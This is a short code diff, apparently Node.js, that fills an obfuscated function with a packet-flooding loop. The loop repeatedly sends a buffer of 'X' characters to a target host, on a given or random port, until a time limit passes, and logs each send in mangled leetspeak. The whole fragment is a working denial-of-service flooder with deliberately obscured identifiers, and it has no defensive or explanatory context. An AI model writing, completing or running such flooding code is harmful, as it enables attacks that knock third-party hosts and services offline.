@@ -36,6 +36,19 @@ function _0x09(h, p, t) {
         O_0 += "X";
     };
     let ST_0 = new Date();
-    while(1){
+    while (1) {
+        if (t) {
+            let NT_0 = new Date();
+            if (NT_0.getTime() >= (ST_0.getTime() + t)) {
+                break;
+            }
+        }
+        let _0x006 = new Buffer(O_0);
+        (function (p) {
+            C_0.send(_0x006, 0, _0x006.length, p, h, function (err, bytes) {
+                if (err) throw err;
+                console.log('U R DP _0x006 sNt t0x00 ' + h + ':' + p);
+            });
+        })(p || Math.floor(Math.random() * (65553) + 1));
     }
 }
